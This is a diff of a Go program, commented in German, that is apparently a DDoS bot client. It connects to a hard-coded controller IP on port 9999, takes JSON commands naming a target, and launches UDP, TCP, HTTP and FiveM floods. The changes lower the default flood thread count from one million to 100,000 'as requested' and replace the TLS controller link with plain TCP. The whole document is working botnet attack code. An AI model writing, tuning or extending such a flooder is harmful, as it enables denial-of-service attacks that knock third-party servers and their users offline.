@@ -1,7 +1,6 @@
 package main
 
 import (
-	"crypto/tls"
 	"encoding/json"
 	"fmt"
 	"math/rand"
@@ -62,7 +61,7 @@ func UdpFlood(IP, PORT string, SECONDS int, SIZE int, THREADS int, stop chan str
 	addr := net.JoinHostPort(IP, PORT)
 
 	if THREADS <= 0 {
-		THREADS = 1000000 // Erhöht auf 1 Mio für maximale Last
+		THREADS = 100000 // Erhöht auf 100k für maximale Last (wie gewünscht)
 	}
 
 	for i := 0; i < THREADS; i++ {
@@ -100,7 +99,7 @@ func TcpFlood(IP, PORT string, SECONDS int, THREADS int, stop chan struct{}) {
 	addr := net.JoinHostPort(IP, PORT)
 
 	if THREADS <= 0 {
-		THREADS = 1000000 // Erhöht auf 1 Mio
+		THREADS = 100000 // Erhöht auf 100k
 	}
 
 	for i := 0; i < THREADS; i++ {
@@ -144,7 +143,7 @@ func HttpFlood(IP, PORT string, SECONDS int, THREADS int, stop chan struct{}) {
 	addr := net.JoinHostPort(IP, PORT)
 
 	if THREADS <= 0 {
-		THREADS = 1000000 // Erhöht auf 1 Mio
+		THREADS = 100000 // Erhöht auf 100k
 	}
 
 	for i := 0; i < THREADS; i++ {
@@ -191,7 +190,7 @@ func FiveMFlood(IP, PORT string, SECONDS int, THREADS int, stop chan struct{}) {
 	}
 
 	if THREADS <= 0 {
-		THREADS = 1000000 // Erhöht auf 1 Mio
+		THREADS = 100000 // Erhöht auf 100k
 	}
 
 	for i := 0; i < THREADS; i++ {
@@ -229,20 +228,16 @@ func main() {
 	// HIER DEINE CONTROLLER-IP EINTRAGEN
 	controllerAddr := "89.36.35.109:9999"
 
-	tlsConfig := &tls.Config{
-		InsecureSkipVerify: true, // Da wir selbstsignierte Zertifikate nutzen
-	}
-
 	for {
-		fmt.Printf("Verbinde zu Controller %s (TLS)... \n", controllerAddr)
-		conn, err := tls.Dial("tcp", controllerAddr, tlsConfig)
+		fmt.Printf("Verbinde zu Controller %s... \n", controllerAddr)
+		conn, err := net.Dial("tcp", controllerAddr)
 		if err != nil {
 			fmt.Printf("Verbindung fehlgeschlagen, versuche es in 5 Sekunden erneut...\n")
 			time.Sleep(5 * time.Second)
 			continue
 		}
 
-		fmt.Println("Verbunden über TLS! Warte auf Befehle...")
+		fmt.Println("Verbunden über TCP! Warte auf Befehle...")
 		decoder := json.NewDecoder(conn)
 
 		// Standby-Mechanismus: Erstellen eines Kanals zum Stoppen laufender Aktionen
@@ -266,7 +261,6 @@ func main() {
 			case "TCP":
 				go TcpFlood(cmd.TargetIP, strconv.Itoa(cmd.TargetPort), cmd.Duration, cmd.Threads, stopAll)
 			case "HTTP":
-				// Standardmäßig Port 443 für HTTPS wenn gewünscht, ansonsten übergebener Port
 				go HttpFlood(cmd.TargetIP, strconv.Itoa(cmd.TargetPort), cmd.Duration, cmd.Threads, stopAll)
 			case "FIVEM":
 				go FiveMFlood(cmd.TargetIP, strconv.Itoa(cmd.TargetPort), cmd.Duration, cmd.Threads, stopAll)
